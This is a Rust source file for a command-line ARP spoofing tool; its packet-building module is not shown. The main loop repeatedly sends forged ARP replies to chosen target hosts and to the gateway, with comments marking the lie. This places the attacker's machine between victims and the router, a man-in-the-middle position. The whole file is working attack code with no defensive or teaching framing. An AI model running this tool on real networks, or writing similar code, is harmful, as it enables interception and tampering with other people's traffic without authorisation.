use pnet_datalink;
use std::{thread, time::Duration};

use clap::Parser;

use std::net::Ipv4Addr;

mod arp;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Network Interface to use (e.g, eth0, wlan0)
    #[arg(short, long)]
    interface: String,

    /// Target IP(s) to spoof. Use multiple times or comma-separated.
    /// Example: -t 192.168.1.10,192.168.1.20
    #[arg(short, long, value_delimiter = ',', num_args = 1..)]
    targets: Vec<String>,

    /// Gateway IP (Router) to impersonate.
    #[arg(short, long)]
    gateway: String,

    /// Spoofing interval in seconds
    #[arg(long, default_value_t = 2)]
    interval: u64,

    /// Enable debug mode for verbose logging
    #[arg(short, long, default_value_t = false)]
    debug: bool,
}

fn main() {
    println!(
        r#"
   ____ _                 _  ___               ____             _    _ 
  / ___| | ___  _   _  __| |/ _ \ _ __  ___   / ___| _   _  ___| | _| |
 | |   | |/ _ \| | | |/ _` | | | | '_ \/ __|  \___ \| | | |/ __| |/ / |
 | |___| | (_) | |_| | (_| | |_| | |_) \__ \   ___) | |_| | (__|   <|_|
  \____|_|\___/ \__,_|\__,_|\___/| .__/|___/  |____/ \__,_|\___|_|\_(_)
                                 |_|                                   
    "#
    );

    let args = Args::parse();

    let interface_name = &args.interface;
    let target_ips: Vec<Ipv4Addr> = args
        .targets
        .iter()
        .map(|t| t.parse().expect("Invalid Target IP address"))
        .collect();
    let gateway_ip: Ipv4Addr = args.gateway.parse().expect("Invalid Gateway IP address");

    let interfaces = pnet_datalink::interfaces();
    let result = interfaces
        .iter()
        .find(|iface| iface.name == *interface_name);

    let iface = match result {
        Some(iface) => iface,
        None => {
            println!("Interface '{}' not found!", interface_name);
            return;
        }
    };

    let my_mac = iface.mac.expect("Interface has no MAC address!");

    let ip_str: Vec<String> = iface.ips.iter().map(|ip| ip.to_string()).collect();

    println!("=== ARP Spoofer Configuration ===");
    println!("Interface: {}", iface.name);
    println!("MAC: {}", my_mac);
    println!("IPs: {}", ip_str.join(", "));
    println!("Targets: {:?}", target_ips);
    println!("Gateway IP: {}", gateway_ip);
    println!("=================================");

    let (mut tx, mut rx) = match pnet_datalink::channel(&iface, Default::default()) {
        Ok(pnet_datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("Failed to open channel: {}", e),
    };

    println!("Socket opened successfully on {}", iface.name);

    // Get our source IP (find the first IPv4 address)
    let my_ip = iface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            std::net::IpAddr::V4(ip) => ip,
            _ => panic!("Should be IPv4"),
        })
        .expect("Interface has no IPv4 address!");

    println!("My IP: {}", my_ip);

    println!("Resolving MAC for Gateway: {}", gateway_ip);
    let gateway_mac = arp::resolve_mac(&mut tx, &mut rx, gateway_ip, my_mac, my_ip)
        .expect("Could not resolve Gateway MAC");
    println!("Gateway MAC: {}", gateway_mac);

    let mut targets = Vec::new();
    for ip in target_ips {
        println!("Resolving MAC for Target: {}", ip);
        match arp::resolve_mac(&mut tx, &mut rx, ip, my_mac, my_ip) {
            Some(mac) => {
                println!("Found Target MAC: {} -> {}", ip, mac);
                targets.push((ip, mac));
            }
            None => eprintln!("Could not resolve MAC for {}", ip),
        }
    }

    if targets.is_empty() {
        eprintln!("No targets resolved. Exiting.");
        return;
    }

    println!("--------------------------------------------------");
    println!("Starting ARP Spoofing...");
    println!("Center Man: {} ({})", my_ip, my_mac);
    println!("Gateway:    {} ({})", gateway_ip, gateway_mac);
    for (ip, mac) in &targets {
        println!("Target:     {} ({})", ip, mac);
    }
    println!("--------------------------------------------------");

    loop {
        for &(target_ip, target_mac) in &targets {
            // 1. Poison Victim: "Gateway is at My MAC"
            let poison_target = arp::reply_arp_request(
                target_mac, // Ethernet Dst
                target_ip,  // ARP Target IP
                my_mac,     // Sender MAC (Us)
                gateway_ip, // Sender IP (Gateway) - THE LIE
            )
            .expect("Failed to build poison packet for target");

            match tx.send_to(&poison_target, None) {
                Some(res) => match res {
                    Ok(_) => {
                        if args.debug {
                            println!("[+] Poisoned Target {}: Told it I am {}", target_ip, gateway_ip);
                        }
                    }
                    Err(e) => eprintln!("Failed to send packet to {}: {}", target_ip, e),
                },
                None => eprintln!("Failed to send packet"),
            }

            // 2. Poison Gateway: "Victim is at My MAC"
            let poison_gateway = arp::reply_arp_request(
                gateway_mac,
                gateway_ip,
                my_mac,    // Sender MAC (Us)
                target_ip, // Sender IP (Target) - THE LIE
            )
            .expect("Failed to build poison packet for gateway");

            match tx.send_to(&poison_gateway, None) {
                Some(res) => match res {
                    Ok(_) => {
                        if args.debug {
                            println!(
                                "[+] Poisoned Gateway: Told it {} is at {}",
                                target_ip, my_ip
                            );
                        }
                    }
                    Err(e) => eprintln!("Failed to send packet to Gateway re {}: {}", target_ip, e),
                },
                None => eprintln!("Failed to send packet"),
            }
        }
        thread::sleep(Duration::from_secs(args.interval));
    }
}
